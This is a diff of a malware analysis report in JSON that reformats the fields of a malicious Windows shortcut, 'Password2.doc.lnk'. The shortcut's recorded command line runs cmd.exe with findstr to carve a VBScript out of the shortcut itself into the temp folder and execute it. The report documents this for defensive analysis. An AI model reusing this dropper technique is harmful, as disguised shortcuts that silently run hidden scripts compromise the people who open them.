@@ -5,7 +5,32 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [2.5293729879831495, 2.656054048095981, 3.966657193954052, 4.754771537537855, 4.824706555307041, 4.270155858411711, 5.647880147838247, 5.587731378872736, 5.813688339463631, 5.21051095434758, 5.5527708210038975, 5.0198846202526335, 5.349081126895216, 5.2641979056656245, 5.507609440985126]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              2.5293729879831495,
+              2.656054048095981,
+              3.966657193954052,
+              4.754771537537855,
+              4.824706555307041,
+              4.270155858411711,
+              5.647880147838247,
+              5.587731378872736,
+              5.813688339463631,
+              5.21051095434758,
+              5.5527708210038975,
+              5.0198846202526335,
+              5.349081126895216,
+              5.2641979056656245,
+              5.507609440985126
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +43,17 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, RelativePath, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"(none)\", \"icon_index\": 134, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"relative_path\": \"..\\\\..\\\\Windows\\\\system32\\\\cmd.exe\", \"command_line_arguments\": \"/v:on /c findstr \\\"rSIPPswjwCtKoZy.*\\\" Password2.doc.lnk > \\\"%tmp%\\\\VEuIqlISMa.vbs\\\" & \\\"%tmp%\\\\VEuIqlISMa.vbs\\\"\", \"icon_file_name\": \"shell32.dll\"}",
+        "body": {
+          "command_line_arguments": "/v:on /c findstr \"rSIPPswjwCtKoZy.*\" Password2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\"",
+          "file_attributes": "(none)",
+          "flags": "IDList, RelativePath, CommandArgs, IconFile, Unicode",
+          "hot_key": "(none)",
+          "icon_file_name": "shell32.dll",
+          "icon_index": 134,
+          "relative_path": "..\\..\\Windows\\system32\\cmd.exe",
+          "run_window": "Normal",
+          "target_file_dosname": "cmd.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -60,7 +95,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"icon_location\": \"shell32.dll\"}",
+        "body": {
+          "icon_location": "shell32.dll"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -80,7 +117,10 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"relative_path\": \"..\\\\..\\\\Windows\\\\system32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\system32\\\\cmd.exe\"}",
+        "body": {
+          "relative_path": "..\\..\\Windows\\system32\\cmd.exe",
+          "target_file_dosname": "Windows\\system32\\cmd.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -100,7 +140,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"Length\": 2848}",
+        "body": {
+          "Length": 2848
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
